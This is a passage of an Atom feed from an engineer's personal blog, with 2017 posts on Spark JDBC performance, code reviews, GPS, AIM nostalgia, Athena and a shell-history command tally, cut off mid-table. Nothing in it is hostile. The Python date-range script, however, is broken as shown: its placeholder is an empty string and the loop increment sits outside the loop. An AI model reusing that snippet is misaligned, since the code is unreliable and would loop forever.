   <link href="http://dangoldin.com/2017/11/07/spark-s-read-jdbc/"/>
   <updated>2017-11-07T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/11/07/spark-s-read-jdbc</id>
   <content:encoded><![CDATA[
<p>Yesterday I spent a bit of time investigating one of our Spark jobs that had suddenly shot up in run time. The purpose of our job is to collect all the events we see in an hour and generate a variety of aggregate tables and files that can then be loaded into various systems. When we first wrote the job it took about 45 minutes to run but as we’ve started seeing much higher data volume the job time has crept up to to 90 minutes. And for some reason yesterday the jobs were not completing even after 2 hours. There was clearly something odd happening.</p>

<p>After digging into it I discovered it was actually a problem with the way we were fetching data from MySQL. In order for us to process our data we load a variety of fact tables from MySQL that are then joined to the raw log level data in Spark. We ingest about a dozen tables this way and it turned out that Spark was just hanging waiting for MySQL. Examining the slow query log it became immediately obvious what the issue was: we were seeing a ton of queries that were “SELECT * FROM (SELECT * FROM table) table WHERE 1=0” quickly followed by “SELECT a, b, c FROM (SELECT * FROM table ) table.” It turns out we were using the <a href="https://spark.apache.org/docs/2.0.0/api/R/read.jdbc.html">read.jdbc</a> function that under the surface Spark does two queries - the first to get the schema and the second to get the data. It’s designed to work on a table but what we were doing was passing in a subery.</p>

<p>I suspect the origin of this creativity was to give us a way to do more advanced querying but it came at a pretty big cost when trying to fetch a table. For one of our simple tables there was a multiple order of magnitude improvement by doing “SELECT * FROM table WHERE 1=0” instead of “SELECT * FROM (SELECT * FROM table) table WHERE 1=0” despite them fetching the exact same data. The reason for this is that MySQL isn’t smart enough to realize what we were doing and has to actually evaluate the inner query before the where clause. This adds up when the underlying table keeps growing.</p>

<p>Making a one line change to fetch the tables rather than rely on the subqueries had an immediate performance improvement. Our jobs that were still going strong after 4 hours started completing in less than an hour and this was all due to improving a bit of SQL. It’s remarkable how trivial, yet impactful some optimizations are and it’s important to keep profiling and understand the slowest parts of the system. Only by fixing those do you improve the whole system. This is obvious and has existed since the 1960’s by virtue of <a href="https://en.wikipedia.org/wiki/Amdahl%27s_law">Amdahl’s law</a> but it’s still relevant today as we embrace more and more big data and parallel processing tools.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Slides from my talk at DataEngConf</title>
   <link href="http://dangoldin.com/2017/10/30/slides-from-my-talk-at-dataengconf/"/>
   <updated>2017-10-30T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/10/30/slides-from-my-talk-at-dataengconf</id>
   <content:encoded><![CDATA[
<p>I had the privilege of giving a talk today at DataEngConf. Unfortunately the talk was not recorded but you can grab the slides <a href="http://dangoldin.com/assets/static/data//DataEngCof_NYC_Data_Startups_Dan_Goldin-Scaling-a-Data-Pipeline-Mystery-to-Mastery.pdf">here</a>. The theme was going over the evolution of the TripleLift data pipeline from the early days where we were sampling events on the client side to the current iteration of a fully fleshed out Lambda architecture. Take a look at the slides and if you have any questions I’d be glad to answer them in the comments.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Philosophy of code</title>
   <link href="http://dangoldin.com/2017/10/29/philosophy-of-code/"/>
   <updated>2017-10-29T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/10/29/philosophy-of-code</id>
   <content:encoded><![CDATA[
<p>After writing my post on the code review pyramid I realized that I had many more thoughts about the highest level, code philosophy, and wanted to dedicate a full post to dig into it. The general idea is that a highly functional engineering team is way past the point of arguing over style and syntax and has reached the point where they share the same code philosophy. At this point all members of the team have an instinctive sense of how and where new code should be written - even if they can’t necessarily explain it.</p>

<p>A concrete example is to think about a data pipeline project. We have a ton of events coming in that need to be aggregated, stored in a database, and then exposed via an API in a UI dashboard. Now imagine having to add some additional fields. Depending on the field you may be able to add it explicitly at the ingestion level, or potentially derive it during the agg, or maybe even calculate it at the API or UI level. Each of these may be entirely reasonable but a good team will have a strong option on how it should be done. This means that every new feature and functionality is implemented similarly and keeps the code base clean and consistent.</p>

<p>This also extends into the way teams approach their class hierarchies and inheritance. Do they go all in and have a ton of factories with complex class hierarchies or do they prefer flatter hierarchies with classes that are able to do more? It also ties into design patterns and which ones are preferred in the code base as well as how to treat nulls and exceptions.</p>

<p>A programming language can’t prescribe every single approach to every type of problem so there’s always some freedom by design. Unfortunately, this can get dangerous on larger projects but strong teams are able to identify the components they want to embrace and the components they want to ban. Frameworks exist because they make these decisions for us. They are purposefully opinionated in order to encourage a particular approach. By having this sort of imposed shared knowledge, every developer using that framework becomes more productive despite the fact that the framework itself limits the flexibility of the language.</p>

<p>The point isn’t to find the one right approach but to realize that it’s more about agreeing on an approach. The fact that engineers still debate the pros and cons of nearly everything to do with software engineering indicates that there’s likely no single answer and we’re better off finding something that’s consistent and right for the team.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The code review pyramid</title>
   <link href="http://dangoldin.com/2017/10/27/the-code-review-pyramid/"/>
   <updated>2017-10-27T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/10/27/the-code-review-pyramid</id>
   <content:encoded><![CDATA[
<p>Every modern software development process contains some form of code reviews. They ensure that all code is looked at by someone other than the author. This improves context, increases code quality, and generally leads to a stronger team and product. Yet there’s a world of difference in code reviews and I I’ve started to think of the different types as a pyramid. The peak is at the highest level but it’s not possible to get to that without going through the lower tiers. Another observation is that the lower levels can done by an individual but the penultimate ones require a team effort.</p>

<ul>
  <li><strong>Style</strong>: This is what I suspect most people consider a code review and ranges from feedback telling the author to add comments, fix typos, or rename variables. This is important to get right since it’s the foundation that everything else rests on but at the same time it’s not going to change any of the functionality.</li>
  <li><strong>Code</strong>: At this level the feedback is meant to change the code itself - if only ever so slightly. This includes proposing alternative implementations to methods or ways to clean up the code to make it easier to read and test. At this level an experienced engineer may also point to an existing method or library that can be reused to avoid code duplication or push for larger methods to be split into smaller, more testable ones.</li>
  <li><strong>Architecture</strong>: If done right the architecture would have been determined before any code was written but often times an issue or idea pops during or after the code has been written. Sure it’s possible to ship the code as is but if it’s a critical or key component it’s  advantageous to clean it up - even if it forces you to redo the way the app is organized and architected.</li>
  <li><strong>Philosophy</strong>: I’ve found that the highest functioning teams coalesce around a code philosophy. They have a shared and implicit understanding of the codebase and understand where and how features should be implement. Rather than focusing on the low level implementation details they’re thinking about where the functionality should exist to make sense given the rest of the code and how to keep things consistent. Teams that have spent a long time working together often start doing this organically but it’s something that all teams should strive for.</li>
</ul>

<p>Most people associate code reviews with the first level of the pyramid but that’s just the beginning. To achieve the best code we need to push ourselves and our teams to think deeper about the code and not focus solely on the superficial factors.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>GPS: The foundation of them all</title>
   <link href="http://dangoldin.com/2017/10/21/gps-the-foundation-of-them-all/"/>
   <updated>2017-10-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/10/21/gps-the-foundation-of-them-all</id>
   <content:encoded><![CDATA[
<p>I spent a few hours driving today and couldn’t stop but think how different driving is now compared to the pre-GPS, pre-smartphone era. Before them I would be extremely wary of deviating from the preplanned path in any way. That meant avoiding all sorts of detours and prioritizing rest stops over exits. It also meant traveling with a road atlas and planning your exact route before setting off. And always questioning whether you missed a particular exit or turn and need to turn around.</p>

<p>These days it’s much simpler - just get in the car, enter your destination, and go. You don’t need to plan having confidence that your phone will get you wherever you need to go. and And if you miss your turn you’ll get a new set of directions to get you back on track. This gives you the freedom to go out of your way to explore whatever looks interesting on the road or change your route to take care of some errands.</p>

<p>These were just the superficial thoughts; what’s really interesting to think about is how much of the current world depends on GPS. Ridesharing companies wouldn’t exist without GPS. Sure we would have had a more intelligent dispatch system but GPS commoditized drivers since you didn’t need to have any street knowledge to drive. In fact, I’ve never taken an Uber or Lyft where the driver wasn’t using a GPS.</p>

<p>Beyond ridesharing, delivery heavy companies would suffer. For the same reasons that GPS makes my life easier it makes life easier for delivery drivers everywhere. This leads to a lower delivery cost which increases total delivery volume - where it’s food delivery or anything purchased remotely.</p>

<p>What’s remarkable is that GPS was developed by the US federal government - initially for military purposes but then expanded into civilian use. A private enterprise wouldn’t have done anything of this global scale and it highlights how positive of an impact a well intentioned government can have. This decision made more than 40 years ago is the foundation for a huge part of the modern world and one can only hope we see more of these foundational innovations.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Schedule automation using Google spreadsheets and Slack</title>
   <link href="http://dangoldin.com/2017/10/20/schedule-automation-using-google-spreadsheets-and-slack/"/>
   <updated>2017-10-20T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/10/20/schedule-automation-using-google-spreadsheets-and-slack</id>
   <content:encoded><![CDATA[
<p>Back in March I <a href="http://dangoldin.com/2017/03/04/automating-admin-work-spreadsheets-to-slack/">wrote a script</a> that would go through an on-call calendar kept in a Google spreadsheet and then post the current week’s schedule to a Slack channel. This worked surprisingly well and I thought of doing something similar for the other engineering team calendars. In addition to the on call rotation, we have a dedicated time for internal tech talks as well as a session to cover the news in the industry. To make them easier to manage we keep them all in that same spreadsheet.</p>

<p>It would have been trivial to write a few more scripts for each type of calendar but I wanted something that could keep scaling to whatever new calendars we introduced. By looking at what’s consistent across each of the calendars - dates and people - we can come up with an approach that can scale to new calendars. My simple solution to this was to introduce a “meta” tab that contains guidance on how to interpret each of the calendar tabs. This includes specifying the date column, the column that will contain the names, and an optional message column. With this information it was straightforward to modify my existing script to accept this information as variables rather than being hardcoded to the structure of a specific spreadsheet.</p>

<p>Basically, <a href="https://github.com/dangoldin/automating-management/blob/master/post_schedule.py">this version of the script</a> treats the Google spreadsheet as a simplified database. It’s able to read and understand what it needs to do yet the spreadsheet itself can be maintained and modified directly by people through the spreadsheet UI. I’m a fan of this hybrid approach and think there’s some really powerful things one can do with this. Spreadsheets are underrated in the tech world and can be leveraged for a variety of power-user cases. Rather than create super specific applications and UIs it might be worth exploring whether you can just build on top of a spreadsheet.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Carrier specific iPhone ads</title>
   <link href="http://dangoldin.com/2017/10/15/carrier-specific-iphone-ads/"/>
   <updated>2017-10-15T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/10/15/carrier-specific-iphone-ads</id>
   <content:encoded><![CDATA[
<p>I had a bit of a lazy Sunday and spent some time watching some football games. During the commercial breaks I saw iPhone 8 ads sponsored by nearly every carrier with the format being nearly identical: a highlight of the features followed by a mention of the carrier. There was nothing there nudging me towards one carrier or another and they all felt like iPhone ads. I’m not sure if Apple is even contributing anything to these but even if they are I suspect the branding outweighs the investment - especially since an ad viewer may decide to get the new iPhone regardless of their existing carrier.</p>

<p>The only explanation I can think of is that the carriers know full well that this won’t have any impact on people switching carriers and is purely a way to accelerate the upgrade cycle and renew the customer contract. This way they can guarantee a 2 year revenue stream and prevent their customer from switching. This feels like an expensive proposition: people are going to stick with an existing carrier if they upgrade a phone and there’s enough iPhone marketing that there’s no need to run yet another ad campaign.</p>

<p>The real winner here is Apple. They built a phone that works across all carriers yet is compelling enough for these carriers to market it. I wonder if this is a holdover from the original iPhone launch that was only available on AT&amp;T. That actually led to a significant number of people switching to AT&amp;T in order to get the iPhone but today’s world is so different I just can’t see this as the reason.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Scale challenges with AWS Athena</title>
   <link href="http://dangoldin.com/2017/10/14/scale-challenges-with-aws-athena/"/>
   <updated>2017-10-14T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/10/14/scale-challenges-with-aws-athena</id>
   <content:encoded><![CDATA[
<p>Almost a year ago, AWS <a href="https://aws.amazon.com/blogs/aws/amazon-athena-interactive-sql-queries-for-data-in-amazon-s3/">launched Athena</a> which allowed you to query data directly off of S3. I loved the idea since it would allow us to simplify our workflow by reducing the need for Spark and Redshift while also cutting our costs. In theory queries that were being run via Spark or Redshift could just be run on top of data stored in S3 without having to load it into any system.</p>

<p>I messed around with a few toy examples and was able to get up and running pretty quickly. Yet I was left disappointed when I threw a real problem at it. We have a variety of jobs that require us scanning a month’s worth of filtered impression data and I wasn’t able to get Athena to successfully complete the query no matter how many different permutations I tried. Every time I thought I had a clever workaround I ended up being disappointed when Athena failed to execute the query.</p>

<p>I’m optimistic that Athena will work through its kinks but at the moment we’re still sticking with our tried and true solutions in Spark and Redshift. Over the next few weeks I’m going to give <a href="https://aws.amazon.com/redshift/spectrum/">Redshift Spectrum</a> a shot which seems to be the best of both worlds.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Downloading your AIM buddy list</title>
   <link href="http://dangoldin.com/2017/10/09/downloading-your-aim-buddy-list/"/>
   <updated>2017-10-09T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/10/09/downloading-your-aim-buddy-list</id>
   <content:encoded><![CDATA[
<p>While writing the <a href="/2017/10/07/farewell-aim/">most recent post</a> about the impending AIM shut down I became curious and logged in to see what what I’ve been missing. The application felt worse but seeing my buddy list made me nostalgic and going through the usernames brought back some fond memories as I tried to remember who each screen name belonged to.</p>

<p>I’m a bit of a hoarded, across both the physical and digital worlds, so didn’t want to lose my buddy list after the shut down. Unfortunately, AIM doesn’t make it very easy to download a copy of your buddy list so I came up with a crude but effective approach. Normally I’d look at the source code, identify the HTML elements containing what I wanted, and write a little bit of code in the JavaScript console to extract what I needed. I tried this approach in the AIM web client but it turns out that they update the HTML code to only show the screen names that are actually in view and it wasn’t obvious where the full list of screen names was being stored.</p>

<p>My extremely simple approach was to open the console and write some code to capture the screen names visible on the screen, add them to a running list, and then scroll further down the page and repeat the process. The efficiency here is limited by the number of screen names visible at any one time so probably the cleverest part of the entire script was just zooming way out to get the list to be as long as possible. Then it only took a few scrolls to get the list of screen names which could then be printed and copied over from the JavaScript console. I didn’t even bother with the deduplication step since I could easily remove duplicates by piping the results into the uniq shell command and then piping it back to my clipboard.</p>

<p>Make sure to download your buddy list before the scheduled shutdown on December 15.</p>

<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="c1">// Start by logging in to www.aim.com and zoom way out</span>

<span class="c1">// Create the initial array that we will</span>
<span class="nx">usernames</span> <span class="o">=</span> <span class="p">[]</span>

<span class="c1">// Run this a bunch of times after scrolling a bit to get the next set of screen names</span>
<span class="nx">els</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByClassName</span><span class="p">(</span><span class="dl">'</span><span class="s1">user-item</span><span class="dl">'</span><span class="p">);</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">els</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">els</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">textContent</span><span class="p">);</span>
    <span class="nx">usernames</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">els</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">textContent</span><span class="p">)</span>
<span class="p">}</span>

<span class="c1">// Just write to the screen but there will likely be duplicates unless you did your scrolls perfectly.</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span> <span class="nx">usernames</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="dl">"</span><span class="se">\n</span><span class="dl">"</span><span class="p">)</span> <span class="p">);</span></code></pre></figure>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Farewell, AIM</title>
   <link href="http://dangoldin.com/2017/10/07/farewell-aim/"/>
   <updated>2017-10-07T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/10/07/farewell-aim</id>
   <content:encoded><![CDATA[
<p>Yesterday’s <a href="https://www.theverge.com/2017/10/6/16435690/aim-shutting-down-after-20-years-aol-instant-messenger">big news</a> was that AIM will be shutting down in December after 20 years of service. This is not surprising - we’ve all moved on from AIM, first to Google Chat and now to the variety of smartphone messaging apps. Yet it’s incredible to think about what AIM was at its peak. I first got an account in middle school and remember it becoming the defacto way to communicate with friends throughout high school and college.</p>

<p>Sure, it’s easy for us to criticize AOL for not being able to capitalize on what they had and losing the messaging market but smartphones disrupted everything. At this point I find it more enjoyable to reminisce about its peak and glory instead of speculating what could have been. It  introduced tens of millions of people to a digital social network and paved the way for every social network since.</p>

<p>I logged in earlier today to see how it’s changed and it was a ghost town. The only others online were people reacting to the shutdown news who were feeling similarly nostalgic. I haven’t logged in in so long that it was a fun game to see if I can identify who the different screen names belonged to - I like to think I got the majority correct but there were definitely a few that I couldn’t remember at all. Despite not having logged in to AIM for the better part of the last decade it’s definitely sad to see it go. At the same time I’m actually surprised that AIM is still around given that no I know has used it in years. It’s just one of those things that is past its prime but has significant nostalgic value. I wonder if anyone would have noticed if it was just quietly shut down.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Generating a series of commands covering a date range</title>
   <link href="http://dangoldin.com/2017/10/05/generating-a-series-of-commands-covering-a-date-range/"/>
   <updated>2017-10-05T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/10/05/generating-a-series-of-commands-covering-a-date-range</id>
   <content:encoded><![CDATA[
<p>I know the title of the post is terrible but I found it difficult to describe the content in another way.</p>

<p>Lately I’ve been spending a decent amount of my time in SQL-land and running some pretty repetitive queries where only some of the arguments are changed. These run the gamut from exporting some data for a date range by day to adding a series of date partitions while messing around with <a href="http://docs.aws.amazon.com/redshift/latest/dg/c-spectrum-external-tables.html">Spectrum</a>. Depending on the amount of these queries I needed to write I’d either just do it manually with a bunch of copy and pastes or use Excel to generate the queries I needed.</p>

<p>Neither of these were that efficient so I wrote a simple <a href="https://github.com/dangoldin/python-tools/blob/master/date_replace.py">script</a> to simplify the entire process. It accepts the format string, the start date, and the end date and replaces the macro in the format string with each date of the date range. Then it’s as simple as either piping the results into pbcopy or copying and pasting it into the SQL client. This gets even better by aliasing the command so it can be run in any terminal window.</p>

<p>I often find that I get into the habit of repeating a manual process over and over instead of just taking the time to automate it. This was no exception: the script took me a few minutes to write and I suspect if I had it I would have saved myself hours given how often I had to do some form of this. Hopefully I can catch myself going down the manual path and build a tool to solve the problem instead.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#! /usr/bin/env python
</span>
<span class="kn">import</span> <span class="nn">datetime</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">string_template</span><span class="p">,</span> <span class="n">start_str</span><span class="p">,</span> <span class="n">end_str</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>

    <span class="n">start</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="n">strptime</span><span class="p">(</span><span class="n">start_str</span><span class="p">,</span> <span class="s">'%Y-%m-%d'</span><span class="p">)</span>
    <span class="n">end</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="n">strptime</span><span class="p">(</span><span class="n">end_str</span><span class="p">,</span> <span class="s">'%Y-%m-%d'</span><span class="p">)</span>

    <span class="k">while</span> <span class="n">start</span> <span class="o">&lt;</span> <span class="n">end</span><span class="p">:</span>
        <span class="k">print</span> <span class="n">string_template</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">''</span><span class="p">,</span> <span class="n">start</span><span class="p">.</span><span class="n">strftime</span><span class="p">(</span><span class="s">'%Y-%m-%d'</span><span class="p">))</span>
<span class="n">start</span> <span class="o">=</span> <span class="n">start</span> <span class="o">+</span> <span class="n">datetime</span><span class="p">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">days</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span></code></pre></figure>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Writer's block and code</title>
   <link href="http://dangoldin.com/2017/10/02/writers-block-and-code/"/>
   <updated>2017-10-02T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/10/02/writers-block-and-code</id>
   <content:encoded><![CDATA[
<p>The past few months I’ve been finding it more difficult to stick to my two post a week schedule. As I write this I’m 5 posts behind that I need to make up for by the end of the week in order to stick with my commitment. I suspect it’s common for true writers to have periods of writer’s block but I’m a casual blogger so it shouldn’t be that hard for me to just sit down and knock something out. I’ve also developed the habit, or maybe even the skill, of going through my day and being able to identify topics and themes that would be interesting to blog out. I have close to 150 of these ideas and yet lately I’ve found it difficult to even start.</p>

<p>I don’t know why but my suspicion is that it’s related to the fact that lately I’ve been much more focused on managing and haven’t had a chance to code as much. Coding gives me that creative recharge that I can use to write. Without that energy writing is less of a pleasure and feels like more of a chore. Over the next few weeks I’m going to block of some coding time with the hope that it helps me get my writing back.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Lessons from a Yes concert</title>
   <link href="http://dangoldin.com/2017/10/01/lessons-from-a-yes-concert/"/>
   <updated>2017-10-01T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/10/01/lessons-from-a-yes-concert</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/yes-concert.jpg" alt="Yes concert" width="3024" height="4032" layout="responsive"/>

<p>Last week I attended a <a href="https://en.wikipedia.org/wiki/Yes_(band)">Yes</a> concert. For the poor souls that don’t know - Yes was an extremely popular progressive rock band in the 70s and 80s. The implication is that the band members are currently in their 60s and 70s yet are still going on tour and performing nearly two hour long shows. And being a rock band from the 70s they ran into the typical challenges with members leaving and rejoining throughout its history.</p>

<p>It’s incredible that Yes is still playing 50 years after forming. I suspect at this point the members have resolved all the conflicts they had and are just appreciate of the fact that they’re still able to play and perform. Imagine if they had this mindset and maturity when they were at their peak. And yet would they have achieved their peak and fame if the individual members didn’t have this sort of competitive conflict in their youth?</p>

<p>I can’t quite put my finger on it but there just seems something admirable about a band continuing to tour and perform decades after its peak. The members know they’re past their prime and yet they keep touring as often as they can. They realize they have a unique opportunity and once on stage feel the same way they used to half a century years ago.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Open sourcing government</title>
   <link href="http://dangoldin.com/2017/09/22/open-sourcing-government/"/>
   <updated>2017-09-22T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/09/22/open-sourcing-government</id>
   <content:encoded><![CDATA[
<p>This past week I had two stereotypical government experiences that got me thinking about ways the open source community can help improve government products and services. There’s a huge different in quality and joy when you compare consumer apps with government services. This is understandable: there’s more competition, fewer restraints, and more money in private enterprise so naturally government offerings won’t be as exciting. At the same time government services affect us much more than a generic app.</p>

<p>Imagine having a civic app that’s as pleasant to use as a modern consumer app. It sounds far-fetched but I wonder whether that needs to be the case. The software development community has leveraged open source to create some incredible tools that make us all orders of magnitude more productive yet every time we have to do something with the government it feels we’re sent back in time.</p>

<p>It doesn’t have to be this way. Given how often we interact with the government wouldn’t it be amazing if we could leverage our combined skills to improve the tools that we’re using? Rather than contributing to yet another open source library why not contribute to improving a government site that you think needs some love?</p>

<p>Of course this is easy to say but there’s a ton of hidden complexity. How is the data itself managed and exposed for development? Who controls the code quality and releases? Who decides what makes it in and what gets rejected? There are a ton of questions that would need to be worked through but I do think there’s something here. We already have the <a href="https://www.usds.gov/">US Digital Service</a> for the federal government but what if the entire open source model could be applied here as well?</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Examining my shell command history</title>
   <link href="http://dangoldin.com/2017/09/21/examining-my-shell-command-history/"/>
   <updated>2017-09-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/09/21/examining-my-shell-command-history</id>
   <content:encoded><![CDATA[
<p>A few years ago I <a href="http://dangoldin.com/2014/05/12/most-commonly-used-shell-commands/">wrote</a> a simple script to analyze my shell history in order to examine my most frequently run shell commands. Being in dire need of a new blog post and suffering from a pretty heavy bout of writer’s block I thought it would be interesting to rerun the analysis and see how it compared to results from over 3 years ago.</p>

<p>It’s tough to say whether my usage has changed significantly. My adoption of zsh with the <a href="https://github.com/robbyrussell/oh-my-zsh">oh-my-zsh plugin</a> have made my usage a bit more efficient - especially when using git. The other obvious change is that I’m running python code half as much as I used to and have also reduced my usage of text editors. I used to use fabric a ton to automate some deploys but have moved completely off of that. What has remained consistent is my blogging - my little alias (cdblog) to move to my blog directory and jekyll have stayed roughly the same as well as some other administrative commands.</p>

<table class="table"><thead><tr><th>Command</th><th>2014 Count</th><th>2017 Count</th><th>2014 Pct</th><th>2017 Pct</th></tr></thead><tbody><tr><td>gst</td><td>0</td><td>795</td><td>0.0%</td><td>9.6%</td></tr><tr><td>cd</td><td>49</td><td>608</td><td>5.1%</td><td>7.3%</td></tr><tr><td>git</td><td>347</td><td>581</td><td>36.0%</td><td>7.0%</td></tr><tr><td>gl</td><td>0</td><td>525</td><td>0.0%</td><td>6.3%</td></tr><tr><td>pwd</td><td>12</td><td>438</td><td>1.2%</td><td>5.3%</td></tr><tr><td>gd</td><td>0</td><td>421</td><td>0.0%</td><td>5.1%</td></tr><tr><td>ls</td><td>103</td><td>415</td><td>10.7%</td><td>5.0%</td></tr><tr><td>gp</td><td>0</td><td>370</td><td>0.0%</td><td>4.4%</td></tr><tr><td>python</td><td>89</td><td>354</td><td>9.2%</td><td>4.3%</td></tr><tr><td>aws</td><td>0</td><td>325</td><td>0.0%</td><td>3.9%</td></tr><tr><td>gbda</td><td>0</td><td>304</td><td>0.0%</td><td>3.7%</td></tr><tr><td>code</td><td>0</td><td>297</td><td>0.0%</td><td>3.6%</td></tr><tr><td>connectec2</td><td>11</td><td>251</td><td>1.1%</td><td>3.0%</td></tr><tr><td>npm</td><td>0</td><td>241</td><td>0.0%</td><td>2.9%</td></tr><tr><td>curl</td><td>0</td><td>139</td><td>0.0%</td><td>1.7%</td></tr><tr><td>jekyll</td><td>12</td><td>112</td><td>1.2%</td><td>1.3%</td></tr><tr><td>emacs</td><td>22</td><td>101</td><td>2.3%</td><td>1.2%</td></tr><tr><td>grep</td><td>4</td><td>87</td><td>0.4%</td><td>1.0%</td></tr><tr><td>less</td><td>0</td><td>85</td><td>0.0%</td><td>1.0%</td></tr><tr><td>find</td><td>3</td><td>80</td><td>0.3%</td><td>1.0%</td></tr><tr><td>gco</td><td>0</td><td>75</td><td>0.0%</td><td>0.9%</td></tr><tr><td>cat</td><td>28</td><td>74</td><td>2.9%</td><td>0.9%</td></tr><tr><td>pip</td><td>14</td><td>68</td><td>1.5%</td><td>0.8%</td></tr><tr><td>docker-compose</td><td>0</td><td>65</td><td>0.0%</td><td>0.8%</td></tr><tr><td>ssh</td><td>28</td><td>62</td><td>2.9%</td><td>0.7%</td></tr><tr><td>cdblog</td><td>14</td><td>62</td><td>1.5%</td><td>0.7%</td></tr><tr><td>rm</td><td>15</td><td>61</td><td>1.6%</td><td>0.7%</td></tr><tr><td>sudo</td><td>9</td><td>61</td><td>0.9%</td><td>0.7%</td></tr><tr><td>gcm</td><td>0</td><td>59</td><td>0.0%</td><td>0.7%</td></tr><tr><td>workon</td><td>7</td><td>54</td><td>0.7%</td><td>0.6%</td></tr><tr><td>rake</td><td>15</td><td>52</td><td>1.6%</td><td>0.6%</td></tr><tr><td>brew</td><td>5</td><td>49</td><td>0.5%</td><td>0.6%</td></tr><tr><td>mv</td><td>4</td><td>49</td><td>0.4%</td><td>0.6%</td></tr><tr><td>to_temp</td><td>0</td><td>49</td><td>0.0%</td><td>0.6%</td></tr><tr><td>go</td><td>0</td><td>47</td><td>0.0%</td><td>0.6%</td></tr><tr><td>gradle</td><td>0</td><td>46</td><td>0.0%</td><td>0.6%</td></tr><tr><td>from_temp</td><td>0</td><td>46</td><td>0.0%</td><td>0.6%</td></tr><tr><td>open</td><td>3</td><td>42</td><td>0.3%</td><td>0.5%</td></tr><tr><td>hub</td><td>0</td><td>42</td><td>0.0%</td><td>0.5%</td></tr><tr><td>mediumify</td><td>0</td><td>41</td><td>0.0%</td><td>0.5%</td></tr><tr><td>grunt</td><td>0</td><td>38</td><td>0.0%</td><td>0.5%</td></tr><tr><td>cp</td><td>2</td><td>37</td><td>0.2%</td><td>0.4%</td></tr><tr><td>history</td><td>5</td><td>35</td><td>0.5%</td><td>0.4%</td></tr><tr><td>mkdir</td><td>2</td><td>35</td><td>0.2%</td><td>0.4%</td></tr><tr><td>gb</td><td>0</td><td>32</td><td>0.0%</td><td>0.4%</td></tr><tr><td>pbpaste</td><td>0</td><td>26</td><td>0.0%</td><td>0.3%</td></tr><tr><td>node</td><td>0</td><td>25</td><td>0.0%</td><td>0.3%</td></tr><tr><td>bower</td><td>0</td><td>24</td><td>0.0%</td><td>0.3%</td></tr><tr><td>g_pass</td><td>0</td><td>22</td><td>0.0%</td><td>0.3%</td></tr><tr><td>du</td><td>0</td><td>18</td><td>0.0%</td><td>0.2%</td></tr><tr><td>connect_ec2</td><td>0</td><td>17</td><td>0.0%</td><td>0.2%</td></tr><tr><td>diff</td><td>0</td><td>17</td><td>0.0%</td><td>0.2%</td></tr><tr><td>ping</td><td>23</td><td>16</td><td>2.4%</td><td>0.2%</td></tr><tr><td>mkvirtualenv</td><td>3</td><td>16</td><td>0.3%</td><td>0.2%</td></tr><tr><td>alias</td><td>0</td><td>16</td><td>0.0%</td><td>0.2%</td></tr><tr><td>echo</td><td>2</td><td>15</td><td>0.2%</td><td>0.2%</td></tr><tr><td>zip</td><td>0</td><td>15</td><td>0.0%</td><td>0.2%</td></tr><tr><td>mail</td><td>0</td><td>14</td><td>0.0%</td><td>0.2%</td></tr><tr><td>scp</td><td>0</td><td>13</td><td>0.0%</td><td>0.2%</td></tr><tr><td>n</td><td>0</td><td>13</td><td>0.0%</td><td>0.2%</td></tr><tr><td>man</td><td>0</td><td>12</td><td>0.0%</td><td>0.1%</td></tr><